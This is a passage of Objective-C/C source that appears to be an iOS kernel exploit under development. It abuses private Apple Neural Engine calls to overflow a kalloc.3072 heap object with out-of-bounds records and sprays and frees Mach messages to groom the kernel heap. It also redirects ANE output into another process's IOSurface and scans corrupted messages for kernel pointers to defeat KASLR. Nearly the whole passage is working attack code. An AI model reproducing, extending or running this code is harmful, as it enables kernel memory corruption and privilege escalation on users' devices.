            if (sidsOut && i < maxOut) sidsOut[i] = sid;
            if (g_nSurf == 1) *firstSidOut = sid;
            *sidCOut = sid; /* last successful create wins */
        } else {
            CFRelease(s);
        }
    }
    [out appendFormat:@"  [+] staged %u IOSurfaces 16KB (ZERO-filled; last sid=%u MARK=0x%x)\n",
        g_nSurf, *sidCOut, SURF_MARK];
}

#pragma mark - v48.1 _ANEClient request lane (run#1: raw conn CLOSED — handle binds to sharedConnection)

/* Shevchenko PoC transport (39_NEW_POC_CROSSREF test()): the model is loaded
   AND evaluated on the SAME _ANEClient sharedConnection, and the request
   carries OUR IOSurface objects — ids[] are our sids at request-build time.
   No raw IOConnect send: the program handle binds to the loading connection
   (run#1: fresh conn -> sel0 kr=0x5, sel2 0xe00002c2). */

#define P044_REQ_IN 191u
/* v58 REQ_IN sweep scaffold (note 130 Phase K1): default 191 (v61 B1:
   count=192 = exactly in-bounds, note 149). Before build,
   PHASE 3 reads Documents/p044_req_in.txt if present — a single "N" line —
   and overrides P044_REQ_IN at runtime. Sweep protocol: one fire per
   force-quit, N = 193, 196, 200, 224, 255; (N-192) = records written OOB
   past kalloc.3072. Find max N that completes without panic; the fill-spill
   scan already reports the OOB records. */
static uint32_t p044ReqInOverride;
static uint32_t p044_req_in(void) { return p044ReqInOverride ? p044ReqInOverride : P044_REQ_IN; }
/* v56: 602112 -> 0x4000. Note 127 proved CheckandPrewire marshals into a FIXED
   kalloc.3072 object (192-record capacity) regardless of request count — the
   overflow is the mechanism, not the geometry. The remaining variable is why
   ANE_MemoryMapRequest_gated returns 0xe00002c2 (kIOReturnBadArgument, note
   126 §2): if small surfaces pass or fail with a DIFFERENT code, size
   validation is the arg check; identical 0x2c2 keeps the count itself suspect.
   CoreML's fallback fire keeps its own 602112 geometry either way. */
#define P044_REQ_IN_BYTES 0x4000u
#define P044_REQ_OUT_BYTES 0x4000u

/* PoC input-surface geometry: w=size/4, h=1, bpr=size, bpe=4, fill byte. */
static CFTypeRef p044_surface_create_poc(size_t size, uint8_t fill) {
    if (!p044_sfCreate || !p044_sfBase || !p044_sfAllocSz || !p044_sfLock || !p044_sfUnlock) return NULL;
    int w = (int)(size / 4);
    int h = 1;
    size_t bpr = size;
    int bpe = 4;
    CFNumberRef cw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef ch = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
    CFNumberRef cbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberCFIndexType, &bpr);
    CFNumberRef cbpe = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
    CFNumberRef cas = CFNumberCreate(kCFAllocatorDefault, kCFNumberCFIndexType, &size);
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerRow"), CFSTR("IOSurfaceBytesPerElement"),
                           CFSTR("IOSurfaceAllocSize") };
    const void *vals[] = { cw, ch, cbpr, cbpe, cas };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 5,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFTypeRef surf = p044_sfCreate(props);
    CFRelease(props);
    CFRelease(cw); CFRelease(ch); CFRelease(cbpr); CFRelease(cbpe); CFRelease(cas);
    if (!surf) return NULL;
    if (p044_sfLock(surf, 0, NULL) == 0) {
        uint8_t *base = (uint8_t *)p044_sfBase(surf);
        size_t n = p044_sfAllocSz(surf);
        if (base && n) memset(base, fill, n);
        p044_sfUnlock(surf, 0, NULL);
    }
    return surf;
}

/* v56 attempt helper: one _ANEModel create + compile + load + handle read.
   Sets g_aneModelObj/g_aneClient/g_aneModelOk and logs the programHandle. */
static int p044_ane_load_attempt(Class Model, Class Client, NSURL *url,
                                 NSDictionary *opts, NSString *key, id cacheID,
                                 NSMutableString *out) {
    id model = ((id (*)(id, SEL, id, id, id, id))objc_msgSend)(
        Model, NSSelectorFromString(@"modelAtURLWithSourceURL:sourceURL:key:cacheURLIdentifier:"),
        url, url, key, cacheID);
    if (!model) {
        [out appendString:@"  _ANEModel create returned nil\n"];
        return 0;
    }
    id client = ((id (*)(id, SEL))objc_msgSend)(Client, NSSelectorFromString(@"sharedConnection"));
    NSError *err = nil;
    /* qos CLOSED (v54): qos 2 on compile+load produced the identical
       status=0x2 statusType=0x9. qos stays 2 (PoC parity). */
    SEL compileSel = NSSelectorFromString(@"compileModel:options:qos:error:");
    SEL loadSel = NSSelectorFromString(@"doLoadModel:options:qos:error:");
    if ([client respondsToSelector:compileSel]) {
        ((BOOL (*)(id, SEL, id, id, unsigned, NSError **))objc_msgSend)(
            client, compileSel, model, opts, 2, &err);
    }
    if ([client respondsToSelector:loadSel]) {
        ((BOOL (*)(id, SEL, id, id, unsigned, NSError **))objc_msgSend)(
            client, loadSel, model, opts, 2, &err);
    }
    uint64_t h = 0;
    SEL phSel = NSSelectorFromString(@"programHandle");
    if ([model respondsToSelector:phSel]) {
        h = ((unsigned long long (*)(id, SEL))objc_msgSend)(model, phSel);
    }
    /* PoC logs getCacheURLIdentifier after load (line ~241) */
    id cache = nil;
    SEL cacheSel = NSSelectorFromString(@"getCacheURLIdentifier");
    if ([model respondsToSelector:cacheSel]) {
        cache = ((id (*)(id, SEL))objc_msgSend)(model, cacheSel);
    }
    [out appendFormat:@"  ANE programHandle=0x%llx err=%@ cache=%@ (%s)\n",
        (unsigned long long)h, err.localizedDescription ?: @"ok",
        cache ?: @"<nil>",
        h != 0 ? "evaluate armed on sharedConnection" : "handle=0 — evaluate NOT armed"];
    g_aneModelObj = model;
    g_aneClient = client;
    g_aneModelOk = (h != 0);
    return g_aneModelOk;
}

/* _ANEModel + _ANEClient sharedConnection load. Handle MUST come back
   non-zero for the evaluate to be armed (PoC aborts on zero handle).
   v56 LANE FIX (notes 126/127): MIL compile is dead on-device for this
   geometry (ANECCompile FAILED, ZinCompilerCoreClassic.cpp:302), but the
   direct lane (client-chosen sids) needs a non-zero handle. If the primary
   transport yields handle==0, retry once with the mlmodelc URL + v54
   transport (opts @{}, key p044, cacheID p044) so the lane arms anyway. */
static int p044_ane_load_model(NSURL *url, NSURL *fallbackURL, NSMutableString *out) {
    dlopen("/System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine",
           RTLD_NOW | RTLD_GLOBAL);
    Class Model = NSClassFromString(@"_ANEModel");
    Class Client = NSClassFromString(@"_ANEClient");
    if (!Model || !Client || !url) {
        [out appendFormat:@"  _ANEModel/client/url missing url=%@ cls=%d/%d\n",
            url.lastPathComponent ?: @"<nil>", Model != Nil, Client != Nil];
        return 0;
    }
    @try {
        /* v56: PoC MIL transport (ViewController.m load_model, lines 226-249).
           v54 closed qos; v55a closed the bundle wiring. Remaining deltas vs
           the known-good transport: model TYPE (MIL bundle vs .mlmodelc) and
           key/cacheID — handled by the lane-fix retry below. */
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *mil = [url.path stringByAppendingPathComponent:@"model.mil"];
        BOOL urlIsDir = NO;
        BOOL milOk = url.path != nil
                     && [fm fileExistsAtPath:url.path isDirectory:&urlIsDir] && urlIsDir
                     && [fm fileExistsAtPath:mil];
        NSDictionary *opts;
        NSString *key;
        id cacheID;
        if (milOk) {
            opts = @{
                @"kANEFModelCacheIdentifierUsingSourceURLKey": @YES,
                @"kANEFCompilationInitiatedByE5MLKey": @YES,
                @"kANEFCompilerOptionsFilenameKey": @"options.plist",
                @"kANEFModelType": @"kANEFModelMIL",
                @"kANEFNetPlistFilenameKey": @"model.mil",
            };
            key = @"XVRC27/mach_msg_min/model.anehash";
            cacheID = nil;
            [out appendString:@"  [v56] MIL transport: PoC key + opts dict + model/ dir\n"];
        } else {
            opts = @{};
            key = @"p044";
            cacheID = @"p044";
            [out appendString:@"  [v56] MIL dir missing — mlmodelc transport (v54)\n"];
        }
        int ok = p044_ane_load_attempt(Model, Client, url, opts, key, cacheID, out);
        if (!ok && fallbackURL && ![fallbackURL isEqual:url]) {
            [out appendString:@"  [v56] LANE FIX: handle=0 — retrying mlmodelc URL + v54 transport "
                              @"(opts @{}, key p044) so the direct lane arms\n"];
            ok = p044_ane_load_attempt(Model, Client, fallbackURL, @{}, @"p044", @"p044", out);
        }
        return ok;
    } @catch (NSException *ex) {
        [out appendFormat:@"  _ANEModel exception %@\n", ex.reason ?: @"?"];
        return 0;
    }
}

/* Build the _ANERequest from OUR surfaces. Forge set = exactly these sids.
   inputIndices 0..253 -> overflow records [our sid][0xc0+k][1][1]. */
static int p044_ane_build_request(NSMutableString *out) {
    Class surfCls = NSClassFromString(@"_ANEIOSurfaceObject");
    Class reqCls = NSClassFromString(@"_ANERequest");
    if (!surfCls || !reqCls) {
        [out appendString:@"  _ANEIOSurfaceObject/_ANERequest missing\n"];
        return 0;
    }
    SEL wrapSel = NSSelectorFromString(@"objectWithIOSurface:");
    NSMutableArray *inputs = [NSMutableArray arrayWithCapacity:p044_req_in()];
    NSMutableArray *inIdx = [NSMutableArray arrayWithCapacity:p044_req_in()];
    uint32_t firstSid = 0, lastSid = 0;
    for (uint32_t i = 0; i < p044_req_in(); i++) {
        CFTypeRef s = p044_surface_create_poc(P044_REQ_IN_BYTES, (uint8_t)(0x41 + (i & 0xf)));
        if (!s) {
            [out appendFormat:@"  input surface %u create failed\n", i];
            return 0;
        }
        uint32_t sid = p044_sfGetID(s);
        if (g_nSurf < 1024u) {
            g_surfs[g_nSurf++] = s;
        } else {
            CFRelease(s);
        }
        if (!firstSid) firstSid = sid;
        lastSid = sid;
        if (g_forgeCount < FORGE_MAX) g_forgeSids[g_forgeCount++] = sid;
        id obj = ((id (*)(id, SEL, CFTypeRef))objc_msgSend)(surfCls, wrapSel, s);
        if (!obj) {
            [out appendFormat:@"  _ANEIOSurfaceObject wrap failed at %u\n", i];
            return 0;
        }
        [inputs addObject:obj];
        [inIdx addObject:@(i)];
    }
    NSMutableArray *outputs = [NSMutableArray array];
    NSMutableArray *outIdx = [NSMutableArray array];
    if (g_foreignOutSid != 0 && p044_sfLookup) {
        /* v52 OUTPUT-SID LANE: the output buffer is a FOREIGN surface resolved
           by global id. Consumer resolves sid -> IOSurface, validates size
           (0x4000 matches A's expected output), validates symbol 0, maps it,
           and the ANE writes the inference result into THEIR memory. No race,
           no clobber, no second fire. g_p044_outSid = foreign sid so the
           spilled out-entry (if the fill hits) carries the foreign sid. */
        CFTypeRef f = p044_sfLookup(g_foreignOutSid);
        if (!f) {
            [out appendFormat:@"  [v52] foreign sid %u no longer resolves — fallback to own output\n",
                g_foreignOutSid];
            g_foreignOutSid = 0;
        } else {
            /* v57 SID-ALIAS RE-VALIDATION (note 129 risk): the target was picked
               PRE-CREATION from census band 162–610; our staged inputs got sids
               161..878. If the foreign surface died between census and build, a
               NEW surface (ours or system) can now hold this sid — the lane
               would silently write OUR memory and invalidate the experiment.
               Re-check post-creation: (a) resolved object must NOT be one of our
               staged surfaces, (b) size must still be 0x4000, (c) refresh the
               pre-fire snapshot so the pre/post diff measures only the fire. */
            int aliased = 0;
            for (uint32_t k = 0; k < g_nSurf; k++) {
                if (g_surfs[k] && CFEqual(g_surfs[k], f)) { aliased = 1; break; }
            }
            if (aliased) {
                [out appendFormat:@"  [v57] SID ALIAS: sid %u now resolves to one of OUR "
                                  @"surfaces (re-created post-census) — lane dropped, own output\n",
                    g_foreignOutSid];
                CFRelease(f);
                g_foreignOutSid = 0;
            } else {
            uint32_t fsid = p044_sfGetID ? p044_sfGetID(f) : g_foreignOutSid;
            size_t fsz = p044_sfAllocSz ? p044_sfAllocSz(f) : 0;
            if (fsz != 0 && fsz != P044_REQ_OUT_BYTES) {
                [out appendFormat:@"  [v57] sid %u size changed %zu → own output fallback "
                                  @"(consumer validates size; not our 0x4000 target)\n",
                    fsid, fsz];
                CFRelease(f);
                g_foreignOutSid = 0;
            } else {
                /* v57: refresh pre-fire snapshot + useCount at arm time */
                if (p044_sfLock(f, 1, NULL) == 0) {
                    uint8_t *b = (uint8_t *)p044_sfBase(f);
                    if (b) { memcpy(g_foreignSnap, b, sizeof(g_foreignSnap)); g_foreignSnapValid = 1; }
                    p044_sfUnlock(f, 1, NULL);
                }
                g_foreignUsePre = p044_sfUseCount ? p044_sfUseCount(f) : 0;
                id obj = ((id (*)(id, SEL, CFTypeRef))objc_msgSend)(surfCls, wrapSel, f);
                CFRelease(f);
                if (!obj) {
                    [out appendString:@"  [v52] foreign output _ANEIOSurfaceObject wrap failed — fallback to own output\n"];
                    g_foreignOutSid = 0;
                } else {
                    g_p044_outSid = fsid; /* spilled out-entry will carry the FOREIGN sid */
                    [outputs addObject:obj];
                    [outIdx addObject:@0];
                    [out appendFormat:@"  [v57] OUTPUT-SID LANE ARMED: output = sid=%u size=%zu "
                                      @"useCount=%u (post-creation re-validated + snapshot refreshed)\n",
                        fsid, fsz, g_foreignUsePre];
                }
            }
            }
        }
    }
    if (outputs.count == 0) {
        CFTypeRef s = p044_surface_create_poc(P044_REQ_OUT_BYTES, 0x61);
        if (!s) {
            [out appendString:@"  output surface create failed\n"];
            return 0;
        }
        uint32_t sid = p044_sfGetID(s);
        if (g_nSurf < 1024u) {
            g_surfs[g_nSurf++] = s;
        } else {
            CFRelease(s);
        }
        g_p044_outSid = sid; /* v61: output entry lands at symbolIndex 191 (0xbf) with the 191-in request */
        if (g_forgeCount < FORGE_MAX) g_forgeSids[g_forgeCount++] = sid;
        id obj = ((id (*)(id, SEL, CFTypeRef))objc_msgSend)(surfCls, wrapSel, s);
        if (!obj) {
            [out appendString:@"  output _ANEIOSurfaceObject wrap failed\n"];
            return 0;
        }
        [outputs addObject:obj];
        [outIdx addObject:@0];
    }
    g_aneReq = ((id (*)(id, SEL, id, id, id, id, id))objc_msgSend)(reqCls,
        NSSelectorFromString(@"requestWithInputs:inputIndices:outputs:outputIndices:procedureIndex:"),
        inputs, inIdx, outputs, outIdx, @0);
    if (!g_aneReq) {
        [out appendString:@"  _ANERequest create failed\n"];
        return 0;
    }
    BOOL valid = NO;
    SEL vSel = NSSelectorFromString(@"validate");
    if ([g_aneReq respondsToSelector:vSel]) {
        valid = ((BOOL (*)(id, SEL))objc_msgSend)(g_aneReq, vSel);
    }
    [out appendFormat:@"  request: inputs=%u outputs=1 procIdx=0 sids=%u..%u validate=%d (forge set=%u)\n",
        (unsigned)p044_req_in(), firstSid, lastSid, valid, g_forgeCount];
    return 1;
}

/* The fire. Same sharedConnection the model was loaded on. qos 2 (PoC). */
static int p044_ane_client_fire(NSMutableString *out) {
    if (!g_aneClient || !g_aneModelObj || !g_aneReq) return -1;
    SEL fireSel = NSSelectorFromString(@"doEvaluateDirectWithModel:options:request:qos:error:");
    if (![g_aneClient respondsToSelector:fireSel]) {
        [out appendString:@"  doEvaluateDirectWithModel selector missing\n"];
        return -1;
    }
    NSError *err = nil;
    BOOL ok = ((BOOL (*)(id, SEL, id, id, id, unsigned, NSError **))objc_msgSend)(
        g_aneClient, fireSel,
        g_aneModelObj, @{}, g_aneReq, (unsigned)2, &err);
    [out appendFormat:@"  doEvaluateDirectWithModel ok=%d err=%@\n", ok,
        err ? err.localizedDescription : @"<nil>"];
    return ok ? 1 : 0;
}

#pragma mark - NEON witnesses (v25 overlay — not the 3072 engine)

typedef struct {
    uint64_t magic[64] __attribute__((aligned(16)));
    pthread_t th;
    thread_act_t port;
    volatile int ready;
    volatile int quit;
} neon_wit_t;

static neon_wit_t g_witness[NEON_WITNESS_COUNT];

static void *neon_witness_worker(void *arg) {
    neon_wit_t *w = (neon_wit_t *)arg;
    w->ready = 1;
    while (!w->quit) {
        __asm__ volatile(
            "ld1 {v0.2d, v1.2d, v2.2d, v3.2d}, [%0], #64   \n"
            "ld1 {v4.2d, v5.2d, v6.2d, v7.2d}, [%0], #64   \n"
            "ld1 {v8.2d, v9.2d, v10.2d, v11.2d}, [%0], #64 \n"
            "ld1 {v12.2d, v13.2d, v14.2d, v15.2d}, [%0], #64\n"
            "ld1 {v16.2d, v17.2d, v18.2d, v19.2d}, [%0], #64\n"
            "ld1 {v20.2d, v21.2d, v22.2d, v23.2d}, [%0], #64\n"
            "ld1 {v24.2d, v25.2d, v26.2d, v27.2d}, [%0], #64\n"
            "ld1 {v28.2d, v29.2d, v30.2d, v31.2d}, [%0]    \n"
            :
            : "r"(w->magic)
            : "v0","v1","v2","v3","v4","v5","v6","v7",
              "v8","v9","v10","v11","v12","v13","v14","v15",
              "v16","v17","v18","v19","v20","v21","v22","v23",
              "v24","v25","v26","v27","v28","v29","v30","v31", "memory");
        /* pure-ALU spin: NEON stays loaded, no syscall */
        for (volatile int s = 0; s < 64; s++) {
            __asm__ volatile("nop");
        }
    }
    return NULL;
}

#pragma mark - Churn + watcher threads

static volatile int g_churn_go = 0;

static void *churn_worker(void *arg) {
    while (g_churn_go) {
        int fds[CHURN_BATCH];
        for (int i = 0; i < CHURN_BATCH; i++) {
            fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        }
        for (int i = 0; i < CHURN_BATCH; i++) {
            if (fds[i] >= 0) close(fds[i]);
        }
        usleep(1);
    }
    return NULL;
}

/* Watcher: continuous recv over the queued DRAIN array while the delayed
   write is in flight. Inline drain corrupted -> event 2. Port-kind drain
   rejected by the kernel -> event 3. Runs until g_watch_go = 0. */
static mach_port_t *g_watchDrain = NULL;
static uint8_t *g_watchScanned = NULL;
static volatile int g_watch_go = 0;

static void *watch_worker(void *arg) {
    uint8_t expected[PAYLOAD_SIZE];
    uint8_t actual[PAYLOAD_SIZE];
    while (g_watch_go) {
        if (g_watchDrain) {
            for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
                if (!g_watchDrain[i] || g_watchScanned[i]) continue;
                uint32_t corruptSize = 0;
                kern_return_t kr = recv_msg_sz(g_watchDrain[i], actual, 0, &corruptSize,
                                               P044_EXPECT_INLINE);
                if (kr == MACH_MSG_SUCCESS) {
                    g_watchScanned[i] = 1;
                    fill_payload(expected, i, 2);
                    if (memcmp(actual, expected, PAYLOAD_SIZE) != 0) {
                        kptr_scan(actual, i, NULL);
                        ev_push(2, i, kr, actual, 0);
                    }
                } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                    g_watchScanned[i] = 1;
                    ev_push(3, i, kr, NULL, corruptSize);
                }
            }
        }
        usleep(0);
    }
    return NULL;
}

#pragma mark - Implementation

@implementation P044AksKaslrReach

/* v55a: PoC-parity resolver (ViewController.m find_bundled_model_path lines
   177-201). THREE candidates, including bundle resourcePath ITSELF — the PoC's
   project copied model.mil/options.plist/weights1.bin FLAT into the bundle root,
   and a subfolder under a synchronized root group gets flattened the same way.
   v55 only checked the model/ dir → "MIL bundle incomplete" on device. */
+ (NSURL *)findMilModelURL:(NSMutableString *)out {
    NSBundle *bundle = [NSBundle mainBundle];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *cands = [NSMutableArray array];
    NSString *res = [bundle pathForResource:@"model" ofType:nil];
    if (res) [cands addObject:res];
    [cands addObject:[bundle.resourcePath stringByAppendingPathComponent:@"model"]];
    [cands addObject:bundle.resourcePath];
    for (NSString *c in cands) {
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:c isDirectory:&isDir] || !isDir) continue;
        NSString *mil = [c stringByAppendingPathComponent:@"model.mil"];
        NSString *opt = [c stringByAppendingPathComponent:@"options.plist"];
        NSString *w = [c stringByAppendingPathComponent:@"weights1.bin"];
        BOOL okM = [fm fileExistsAtPath:mil];
        BOOL okO = [fm fileExistsAtPath:opt];
        BOOL okW = [fm fileExistsAtPath:w];
        if (okM && okO && okW) {
            [out appendFormat:@"  MIL bundle complete: %@\n", c];
            return [NSURL fileURLWithPath:c isDirectory:YES];
        }
        [out appendFormat:@"  MIL candidate %@: mil=%d opts=%d weights=%d\n",
            [c isEqualToString:bundle.resourcePath] ? @"<bundle-root>" : c.lastPathComponent,
            okM, okO, okW];
    }
    [out appendString:@"  MIL bundle incomplete — mlmodelc fallback\n"];
    return nil;
}

+ (NSURL *)findCoreMLModelURL:(NSMutableString *)out {
    [out appendString:@"\n=== PHASE 1: Find CoreML model ===\n"];

    NSBundle *bundle = [NSBundle mainBundle];

    NSURL *compiledURL = [bundle URLForResource:p044_model_name() withExtension:@"mlmodelc"];
    if (compiledURL) {
        [out appendFormat:@"  Found compiled model: %@\n", compiledURL.path];
        return compiledURL;
    }

    NSURL *sourceURL = [bundle URLForResource:p044_model_name() withExtension:@"mlmodel"];
    if (!sourceURL) {
        NSString *sourcePath = [bundle.resourcePath stringByAppendingPathComponent:
                               [p044_model_name() stringByAppendingPathExtension:@"mlmodel"]];
        if ([[NSFileManager defaultManager] fileExistsAtPath:sourcePath]) {
            sourceURL = [NSURL fileURLWithPath:sourcePath];
        }
    }

    if (!sourceURL) {
        [out appendString:@"  STOP: No .mlmodelc or .mlmodel in bundle\n"];
        [out appendFormat:@"  Bundle: %@\n", bundle.bundlePath];
        return nil;
    }

    [out appendFormat:@"  Found source model: %@\n", sourceURL.path];
    NSError *err = nil;
    NSURL *compiled = [MLModel compileModelAtURL:sourceURL error:&err];
    if (!compiled) {
        [out appendFormat:@"  STOP: compile failed: %@\n", err.localizedDescription];
        return nil;
    }
    [out appendFormat:@"  Compiled to: %@\n", compiled.path];
    return compiled;
}

+ (MLModel *)loadCoreMLModel:(NSURL *)modelURL out:(NSMutableString *)out {
    [out appendString:@"\n=== PHASE 2: Load CoreML model ===\n"];

    MLModelConfiguration *configuration = [[MLModelConfiguration alloc] init];
    configuration.computeUnits = MLComputeUnitsAll;

    NSError *err = nil;
    MLModel *model = [MLModel modelWithContentsOfURL:modelURL
                                       configuration:configuration
                                               error:&err];
    if (!model) {
        [out appendFormat:@"  STOP: MLModel load failed: %@\n", err.localizedDescription];
        return nil;
    }

    [out appendString:@"  MLModel loaded successfully\n"];
    return model;
}

+ (MLDictionaryFeatureProvider *)createFeatures:(NSMutableString *)out {
    [out appendFormat:@"\n=== PHASE 3: Create %u input features ===\n", INPUT_COUNT];

    NSMutableDictionary<NSString *, MLFeatureValue *> *features =
        [NSMutableDictionary dictionaryWithCapacity:INPUT_COUNT];
    double expected = 0.0;
    uint32_t tailStart = INPUT_COUNT - (g_forgeCount ? FORGE_COUNT : 0);

    for (uint32_t i = 0; i < INPUT_COUNT; i++) {
        double value;
        if (g_forgeCount && i >= tailStart) {
            /* v47 E3: last input slots stage the forge sids. Sid field =
               staged input u32 (P080/P075 mechanism). */
            value = (double)g_forgeSids[(i - tailStart) % g_forgeCount];
        } else {
            value = (double)(i + 1);
        }
        /* v61: the handwritten MIL names inputs in_0..in_190 (no padding);
           the old x_%03u names never bound for the handwritten bundle.
           providerB keeps x_%03u — model B is the Xcode-compiled bundle. */
        NSString *name = [NSString stringWithFormat:@"in_%u", i];

        NSError *err = nil;
        MLMultiArray *array = [[MLMultiArray alloc] initWithShape:@[@1]
                                                        dataType:MLMultiArrayDataTypeDouble
                                                           error:&err];
        if (!array) {
            [out appendFormat:@"  STOP: MLMultiArray failed for %@: %@\n",
                name, err.localizedDescription];
            return nil;
        }
        array[0] = @(value);
        features[name] = [MLFeatureValue featureValueWithMultiArray:array];
        expected += value;
    }

    [out appendFormat:@"  Created %u features, expected sum=%.0f\n", INPUT_COUNT, expected];
    g_expectedSum = expected; /* v59: for PHASE 6f output-match scan */
    if (g_forgeCount) {
        [out appendFormat:@"  v47 FORGE TAIL: slots %u..%u (%u slots) carry forge sids (head sid_C=%u)\n",
            tailStart, INPUT_COUNT - 1, FORGE_COUNT, g_forgeSids[0]];
        NSMutableString *tail = [NSMutableString string];
        for (uint32_t i = tailStart; i < INPUT_COUNT; i++) {
            [tail appendFormat:(i > tailStart) ? @",%u" : @"%u",
                g_forgeSids[(i - tailStart) % g_forgeCount]];
        }
        [out appendFormat:@"  tail=[%@]\n", tail];
    }

    NSError *err = nil;
    MLDictionaryFeatureProvider *provider =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
    if (!provider) {
        [out appendFormat:@"  STOP: FeatureProvider failed: %@\n", err.localizedDescription];
        return nil;
    }

    [out appendString:@"  FeatureProvider created\n"];
    return provider;
}

/* v24 spray: proven mixed layout + last-8 port-kind tail. */
+ (pair_t *)sprayOut:(NSMutableString *)out drain:(mach_port_t **)outDrain {
    [out appendFormat:@"\n=== PHASE 4: Spray mach_msg pairs=%u payload=0x%x (every %u victim = port-kind + last %u port-kind) ===\n",
        PAIR_COUNT, PAYLOAD_SIZE, PORT_VICTIM_EVERY, TAIL_PORTK_COUNT];

    mach_port_t *drain = calloc(DRAIN_COUNT, sizeof(*drain));
    pair_t *pairs = calloc(PAIR_COUNT, sizeof(*pairs));
    if (!drain || !pairs) {
        free(drain);
        free(pairs);
        return NULL;
    }

    int drainOK = 0;
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        drain[i] = make_port();
        if (drain[i]) {
            send_msg(drain[i], i, 2);
            drainOK++;
        }
    }
    [out appendFormat:@"  drain: %d/%u kmsgs queued (late-window sensors)\n", drainOK, DRAIN_COUNT];

    int pairOK = 0, portKind = 0;
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        pairs[i].hole = make_port();
        pairs[i].victim = make_port();
        pairs[i].kind = (i >= (PAIR_COUNT - TAIL_PORTK_COUNT) ||
                         (i % PORT_VICTIM_EVERY == 3)) ? 1 : 0;
        /* v49: TAIL port-kind victims = 8-desc probe (descs 3..8 in tile);
           non-tail port-kind = 2-desc control. Inline/hole pairs unused. */
        pairs[i].descN = (pairs[i].kind == 1 &&
                          i >= (PAIR_COUNT - TAIL_PORTK_COUNT)) ? P044_PORT_DESC_N : 2;
        pairs[i].done = 0;
        if (pairs[i].hole && pairs[i].victim) {
            send_msg(pairs[i].hole, i, 0);
            if (pairs[i].kind == 1) {
                send_port_msg(pairs[i].victim, i, pairs[i].descN);
                    portKind++;
            } else {
                send_msg(pairs[i].victim, i, 1);
            }
            pairOK++;
        }
    }
    [out appendFormat:@"  spray: %d/%u pairs (inline=%d portkind=%d)\n",
        pairOK, PAIR_COUNT, pairOK - portKind, portKind];

    #if P044_HOLE_MODE == 2
    [out appendString:@"  HOLE_MODE=2: freeing contiguous RUN of hole+victim pairs [1024..1536) — adjacent frees so the request element's neighbor is a hole...\n"];
    for (uint32_t i = P044_HOLE_RUN_LO; i < P044_HOLE_RUN_HI; i++) {
        if (pairs[i].hole) recv_msg(pairs[i].hole, NULL, RECV_WAIT_MS_WORK);
        if (pairs[i].victim) {
            recv_msg(pairs[i].victim, NULL, RECV_WAIT_MS_WORK);
            pairs[i].done = 1; /* freed at fire time; not scanned */
        }
    }
    [out appendString:@"  Run freed (512 pairs = ~1024 adjacent 3072 elements).\n"];
#elif P044_HOLE_MODE == 1
    [out appendString:@"  Freeing holes to create empty kalloc.3072 slots (HOLE_MODE=1: freed-hole lane)...\n"];
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (pairs[i].hole) recv_msg(pairs[i].hole, NULL, RECV_WAIT_MS_WORK);
    }
#else
    [out appendString:@"  HOLE_MODE=0: holes stay LIVE (kmsg-landing lane — neighbor is a live kmsg)\n"];
#endif
    sync();

    [out appendString:@"  Spray complete. Holes freed.\n"];
    *outDrain = drain;
    return pairs;
}

/* t+0 victim scan. Inline: success+diff, plus size-deviation rejections.
   Port-kind: BOTH success-with-diff AND non-timeout kernel rejection. */
+ (int)scanVictims:(pair_t *)pairs out:(NSMutableString *)out {
    uint8_t expected[PAYLOAD_SIZE];
    uint8_t actual[PAYLOAD_SIZE];
    int hits = 0;

    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (!pairs[i].victim || pairs[i].done) continue;

        uint32_t corruptSize = 0;
        kern_return_t kr = recv_msg_sz(pairs[i].victim, actual, RECV_WAIT_MS_WORK, &corruptSize,
                                       (pairs[i].kind == 0) ? P044_EXPECT_INLINE : P044_EXPECT_PORTK);

        if (pairs[i].kind == 0) {
            if (kr == MACH_MSG_SUCCESS) {
                pairs[i].done = 1;
                fill_payload(expected, i, 1);
                size_t first = SIZE_MAX;
                size_t changed = 0;
                for (size_t j = 0; j < PAYLOAD_SIZE; j++) {
                    if (actual[j] != expected[j]) {
                        if (first == SIZE_MAX) first = j;
                        changed++;
                    }
                }
                if (first != SIZE_MAX) {
                    hits++;
                    [out appendFormat:@"  HIT inline victim=%u first_diff=0x%zx changed=%zu\n",
                        i, first, changed];
                    hexdump16(actual, first, out);
                    kptr_scan(actual, (uint32_t)i, out);
                    fingerprint_scan(actual, first, out);
                }
            } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                pairs[i].done = 1;
                hits++;
                [out appendFormat:
                    @"  *** INLINE-REJECTION victim=%u recv kr=0x%x corrupt_msgh_size=0x%x (expected 0x%x) ***\n",
                    i, kr, corruptSize,
                    (unsigned)(sizeof(mach_msg_header_t) + PAYLOAD_SIZE)];
                ev_push(4, i, kr, NULL, corruptSize);
            }
        } else {
            /* D2 PORT-KIND PAYLOAD DIFF: control (2 descs) clean = body word 2
               and pad all zero. probe (8 descs) clean = body word 8, descs
               3..8 at body+0x1c..0x64 NONZERO (names + disp 0x11), pad from
               0x64 zero. Pad smash with ANE records + body intact = occupancy.
               Conversion needs forged nDesc/type or a non-fill kptr. */
            if (kr == MACH_MSG_SUCCESS) {
                uint32_t body = 0;
                memcpy(&body, actual, sizeof(body));
                int probe = (body == P044_PORT_DESC_N);
                int diff = (body != 2u && body != (uint32_t)P044_PORT_DESC_N);
                size_t padStart = probe ? (0x04 + 12 * P044_PORT_DESC_N) : 0x1c;
